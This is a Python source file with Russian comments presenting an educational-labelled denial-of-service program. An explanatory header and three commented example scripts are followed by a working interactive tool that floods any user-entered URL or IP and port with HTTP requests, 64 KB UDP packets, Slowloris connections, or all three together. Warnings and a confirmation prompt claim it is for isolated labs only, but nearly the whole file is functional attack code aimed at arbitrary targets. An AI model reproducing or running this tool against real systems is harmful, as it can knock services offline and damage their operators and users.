# Атаки типа "Отказ в обслуживании" (DoS)
# Атака типа "отказ в обслуживании" (DoS) - это атака, при которой
# злоумышленник намеренно пытается либо частично вывести из строя, либо
# полностью парализовать электронное устройство или сеть, заливая их
# большим количеством запросов или данных, которые перегружают цель и
# делают ее неспособной надлежащим образом реагировать на законные запросы.
# Во многих случаях запросы, отправляемые злоумышленником, теоретически
# легитимны каждый сам по себе - например, обычный запрос на загрузку вебстраницы. 
# В других случаях запросы не являются обычными запросами.
# Вместо этого они используют знания различных протоколов для отправки
# запросов, которые оптимизируют или даже усиливают эффект атаки.
# В любом случае атаки типа "отказ в обслуживании" работают за счет
# перегрузки центральных процессоров (CPU) или памяти систем
# вычислительных устройств, использования всей доступной пропускной
# способности сети связи или исчерпания ресурсов сетевой инфраструктуры,
# таких как маршрутизаторы.

# 1. Пример: перегрузка CPU целевого сервера ===============================================================================
# import threading
# import requests
# import time

# # Целевой URL (например, локальный тестовый сервер)
# TARGET_URL = "http://localhost:8080/"

# # Количество потоков (чем больше, тем сильнее нагрузка)
# NUM_THREADS = 200

# # Флаг для остановки атаки
# attack_running = True

# def send_request():
#     """Функция для каждого потока: непрерывно шлёт HTTP-запросы"""
#     while attack_running:
#         try:
#             response = requests.get(TARGET_URL, timeout = 1)
#             # Можно добавить небольшую задержку для реалистичности
#             # time.sleep(0.01)
#         except Exception:
#             pass  # Игнорируем ошибки (сервер может упасть)

# def start_dos_attack():
#     global attack_running
#     attack_running = True
#     threads = []
    
#     print(f"Запуск DoS-атаки на {TARGET_URL} с {NUM_THREADS} потоками...")
    
#     for _ in range(NUM_THREADS):
#         thread = threading.Thread(target = send_request)
#         thread.start()
#         threads.append(thread)
    
#     # Атака продолжается 30 секунд (демонстрация)
#     time.sleep(30)
#     attack_running = False
    
#     # Ожидание завершения всех потоков
#     for thread in threads:
#         thread.join()
    
#     print("DoS-атака завершена.")

# if __name__ == "__main__":
#     start_dos_attack()

# 2. Пример: исчерпание пропускной способности (UDP-флуд) ==================================================================
# import socket
# import threading
# import time

# TARGET_IP = "127.0.0.1"
# TARGET_PORT = 12345
# NUM_THREADS = 50
# DURATION = 20  # секунд

# stop_event = threading.Event()

# def udp_flood():
#     """Отправляет большие UDP-пакеты для загрузки сети"""
#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     # Большой пакет данных (64 КБ)
#     data = b"X" * 64000  
    
#     while not stop_event.is_set():
#         try:
#             sock.sendto(data, (TARGET_IP, TARGET_PORT))
#         except:
#             pass  # Игнорируем ошибки отправки

# def start_udp_attack():
#     threads = []
#     print(f"Запуск UDP-флуда на {TARGET_IP}:{TARGET_PORT} с {NUM_THREADS} потоками...")
    
#     for _ in range(NUM_THREADS):
#         t = threading.Thread(target = udp_flood)
#         t.start()
#         threads.append(t)
    
#     time.sleep(DURATION)
#     stop_event.set()
    
#     for t in threads:
#         t.join()
    
#     print("UDP-атака завершена.")

# if __name__ == "__main__":
#     start_udp_attack()

# 3. Пример: перегрузка памяти сервера (медленный HTTP-клиент) =============================================================
# import socket
# import time
# import threading

# TARGET_HOST = "localhost"
# TARGET_PORT = 8080
# NUM_CONNECTIONS = 100
# SLOW_BYTES = b"X" * 100  # Маленькие порции данных

# def slow_loris():
#     """Медленно отправляет заголовки HTTP, удерживая соединение открытым"""
#     try:
#         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         sock.connect((TARGET_HOST, TARGET_PORT))
#         # Отправляем частичный HTTP-запрос
#         sock.send(b"GET / HTTP/1.1\r\n")
#         sock.send(b"Host: " + TARGET_HOST.encode() + b"\r\n")
#         sock.send(b"User-Agent: SlowLoris\r\n")
        
#         # Периодически шлём новые заголовки, чтобы сервер не закрыл соединение
#         last_time = time.time()
#         while (time.time() - last_time) < 30:  # Держим 30 секунд
#             sock.send(SLOW_BYTES)
#             time.sleep(10)  # Пауза между отправками
#     except:
#         pass
#     finally:
#         sock.close()

# def start_slow_loris():
#     threads = []
#     print(f"Запуск Slow Loris на {TARGET_HOST}:{TARGET_PORT} с {NUM_CONNECTIONS} соединениями...")
    
#     for _ in range(NUM_CONNECTIONS):
#         t = threading.Thread(target = slow_loris)
#         t.start()
#         threads.append(t)
    
#     for t in threads:
#         t.join()

# if __name__ == "__main__":
#     start_slow_loris()

# ===================================================================================================================================================

import threading
import requests
import socket
import time
import sys
import os
from datetime import datetime

# Конфигурация по умолчанию
DEFAULT_TARGET_URL = "http://localhost:8080/"
DEFAULT_TARGET_IP = "127.0.0.1"
DEFAULT_TARGET_PORT = 8080
DEFAULT_NUM_THREADS = 50
DEFAULT_DURATION = 30  # секунд

# Глобальные флаги для остановки атак
attack_running = True
stop_udp_event = threading.Event()
stop_slow_event = threading.Event()

def clear_screen():
    """Очистка экрана"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Вывод баннера программы"""
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║           DoS АТАКИ - ДЕМОНСТРАЦИОННАЯ ПРОГРАММА             ║
    ║                    ТОЛЬКО ДЛЯ ОБУЧЕНИЯ                       ║
    ╚══════════════════════════════════════════════════════════════╝
    
    ВНИМАНИЕ: Эта программа предназначена ТОЛЬКО для тестирования
    в изолированной среде. Использование против реальных систем
    без разрешения является ПРОТИВОЗАКОННЫМ!
    """
    print(banner)

def show_menu():
    """Вывод меню выбора атаки"""
    print("\n" + "=" * 60)
    print("ДОСТУПНЫЕ ТИПЫ АТАК:")
    print("=" * 60)
    print("1. CPU-флуд (HTTP запросы) - перегрузка процессора сервера")
    print("2. UDP-флуд - исчерпание пропускной способности сети")
    print("3. Slow Loris - удержание соединений (перегрузка памяти)")
    print("4. Комбинированная атака (все три типа одновременно)")
    print("5. Выход")
    print("=" * 60)

def get_parameters():
    """Получение параметров атаки от пользователя"""
    print("\nНАСТРОЙКА ПАРАМЕТРОВ (Enter для значений по умолчанию):")
    
    # Выбор цели атаки
    target_type = input("\nТип цели (1 - HTTP сервер, 2 - IP/порт) [1]: ").strip()
    
    if target_type == "2":
        target_ip = input(f"IP адрес [{DEFAULT_TARGET_IP}]: ").strip()
        target_ip = target_ip if target_ip else DEFAULT_TARGET_IP
        target_port = input(f"Порт [{DEFAULT_TARGET_PORT}]: ").strip()
        target_port = int(target_port) if target_port else DEFAULT_TARGET_PORT
        target_url = None
    else:
        target_url = input(f"URL [{DEFAULT_TARGET_URL}]: ").strip()
        target_url = target_url if target_url else DEFAULT_TARGET_URL
        target_ip = DEFAULT_TARGET_IP
        target_port = DEFAULT_TARGET_PORT
    
    num_threads = input(f"Количество потоков [{DEFAULT_NUM_THREADS}]: ").strip()
    num_threads = int(num_threads) if num_threads else DEFAULT_NUM_THREADS
    
    duration = input(f"Длительность атаки (сек) [{DEFAULT_DURATION}]: ").strip()
    duration = int(duration) if duration else DEFAULT_DURATION
    
    return target_url, target_ip, target_port, num_threads, duration

def cpu_flood_attack(url, num_threads, stop_flag):
    """Атака типа CPU-флуд (HTTP запросы)"""
    def send_request():
        while stop_flag[0]:
            try:
                response = requests.get(url, timeout = 1)
                # Небольшая задержка для имитации реальной нагрузки
                # time.sleep(0.001)
            except Exception:
                pass
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_request)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    print(f"[CPU-флуд] Запущено {num_threads} потоков на {url}")
    return threads

def udp_flood_attack(ip, port, num_threads, stop_event):
    """Атака типа UDP-флуд"""
    def send_udp():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Пакет размером 64 КБ
            data = b"X" * 64000
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            while not stop_event.is_set():
                try:
                    sock.sendto(data, (ip, port))
                except:
                    pass
        except Exception as e:
            pass
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target = send_udp)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    print(f"[UDP-флуд] Запущено {num_threads} потоков на {ip}:{port}")
    return threads

def slow_loris_attack(host, port, num_connections, stop_event):
    """Атака типа Slow Loris"""
    def slow_loris_connection():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Отправляем частичный HTTP-запрос
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(b"User-Agent: SlowLoris/1.0\r\n")
            
            # Периодически отправляем новые заголовки
            while not stop_event.is_set():
                try:
                    sock.send(b"X-Header: keep-alive\r\n")
                    time.sleep(10)  # Задержка между отправками
                except:
                    break
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
    
    connections = []
    for i in range(num_connections):
        thread = threading.Thread(target = slow_loris_connection)
        thread.daemon = True
        thread.start()
        connections.append(thread)
    
    print(f"[Slow Loris] Установлено {num_connections} медленных соединений на {host}:{port}")
    return connections

def combined_attack(target_url, target_ip, target_port, num_threads, duration):
    """Комбинированная атака всех типов одновременно"""
    print("\n" + "!" * 60)
    print("ЗАПУСК КОМБИНИРОВАННОЙ АТАКИ")
    print("!" * 60)
    
    stop_flag = [True]  # Используем список для изменяемого флага
    stop_udp_event.clear()
    stop_slow_event.clear()
    
    # Запускаем все три атаки
    print("\n[1/3] Запуск CPU-флуд...")
    cpu_threads = cpu_flood_attack(target_url, num_threads, stop_flag)
    
    print("[2/3] Запуск UDP-флуд...")
    udp_threads = udp_flood_attack(target_ip, target_port, num_threads, stop_udp_event)
    
    print("[3/3] Запуск Slow Loris...")
    slow_threads = slow_loris_attack(target_ip, target_port, num_threads // 2, stop_slow_event)
    
    print(f"\n⚡ КОМБИНИРОВАННАЯ АТАКА АКТИВНА! Длительность: {duration} секунд")
    print("Цели:")
    print(f"  - HTTP: {target_url}")
    print(f"  - UDP/Slow: {target_ip}:{target_port}")
    print(f"  - Потоков: {num_threads} (CPU), {num_threads} (UDP), {num_threads // 2} (Slow)")
    
    # Прогресс-бар
    for i in range(duration):
        time.sleep(1)
        percent = (i + 1) / duration * 100
        bar_length = 50
        filled = int(bar_length * (i + 1) / duration)
        bar = '█' * filled + '░' * (bar_length - filled)
        print(f"\rПрогресс: |{bar}| {percent:.1f}% ({i + 1}/{duration} сек)", end = '')
    
    print("\n\nОстановка комбинированной атаки...")
    
    # Останавливаем все атаки
    stop_flag[0] = False
    stop_udp_event.set()
    stop_slow_event.set()
    
    time.sleep(2)  # Ждём завершения потоков
    print("✅ Комбинированная атака завершена!\n")

def run_attack(attack_type, target_url, target_ip, target_port, num_threads, duration):
    """Запуск выбранного типа атаки"""
    if attack_type == 1:  # CPU-флуд
        print(f"\nЗапуск CPU-флуд атаки на {target_url}")
        print(f"Потоков: {num_threads}, Длительность: {duration} сек\n")
        
        stop_flag = [True]
        threads = cpu_flood_attack(target_url, num_threads, stop_flag)
        
        # Прогресс-бар
        for i in range(duration):
            time.sleep(1)
            percent = (i + 1) / duration * 100
            bar_length = 50
            filled = int(bar_length * (i + 1) / duration)
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\rПрогресс: |{bar}| {percent:.1f}% ({i + 1}/{duration} сек)", end = '')
        
        print("\n\nОстановка атаки...")
        stop_flag[0] = False
        time.sleep(1)
        print("✅ Атака завершена!\n")
    
    elif attack_type == 2:  # UDP-флуд
        print(f"\nЗапуск UDP-флуд атаки на {target_ip}:{target_port}")
        print(f"Потоков: {num_threads}, Длительность: {duration} сек\n")
        
        stop_udp_event.clear()
        threads = udp_flood_attack(target_ip, target_port, num_threads, stop_udp_event)
        
        # Прогресс-бар
        for i in range(duration):
            time.sleep(1)
            percent = (i + 1) / duration * 100
            bar_length = 50
            filled = int(bar_length * (i + 1) / duration)
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\rПрогресс: |{bar}| {percent:.1f}% ({i + 1}/{duration} сек)", end = '')
        
        print("\n\nОстановка атаки...")
        stop_udp_event.set()
        time.sleep(1)
        print("✅ Атака завершена!\n")
    
    elif attack_type == 3:  # Slow Loris
        print(f"\nЗапуск Slow Loris атаки на {target_ip}:{target_port}")
        print(f"Соединений: {num_threads}, Длительность: {duration} сек\n")
        
        stop_slow_event.clear()
        threads = slow_loris_attack(target_ip, target_port, num_threads, stop_slow_event)
        
        # Прогресс-бар
        for i in range(duration):
            time.sleep(1)
            percent = (i + 1) / duration * 100
            bar_length = 50
            filled = int(bar_length * (i + 1) / duration)
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\rПрогресс: |{bar}| {percent:.1f}% ({i + 1}/{duration} сек)", end = '')
        
        print("\n\nОстановка атаки...")
        stop_slow_event.set()
        time.sleep(1)
        print("✅ Атака завершена!\n")

def main():
    """Главная функция программы"""
    clear_screen()
    print_banner()
    
    while True:
        show_menu()
        choice = input("\nВыберите тип атаки (1-5): ").strip()
        
        if choice == "5":
            print("\nВыход из программы. Будьте ответственны при использовании знаний о безопасности!")
            sys.exit(0)
        
        if choice not in ["1", "2", "3", "4"]:
            print("\n❌ Неверный выбор! Пожалуйста, выберите 1, 2, 3, 4 или 5.")
            time.sleep(2)
            continue
        
        attack_type = int(choice)
        
        # Получаем параметры
        target_url, target_ip, target_port, num_threads, duration = get_parameters()
        
        # Подтверждение запуска
        print("\n⚠️  ПРЕДУПРЕЖДЕНИЕ! Эта программа предназначена только для обучения!")
        confirm = input("Вы уверены, что используете её в изолированной тестовой среде? (да/нет): ").strip().lower()
        
        if confirm != "да":
            print("Запуск отменён.")
            time.sleep(2)
            continue
        
        # Запускаем атаку
        if attack_type == 4:
            combined_attack(target_url, target_ip, target_port, num_threads, duration)
        else:
            run_attack(attack_type, target_url, target_ip, target_port, num_threads, duration)
        
        input("\nНажмите Enter для продолжения...")
        clear_screen()
        print_banner()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nПрограмма прервана пользователем. Выход...")
        sys.exit(0)
    except Exception as e:
        print(f"\nПроизошла ошибка: {e}")
        sys.exit(1)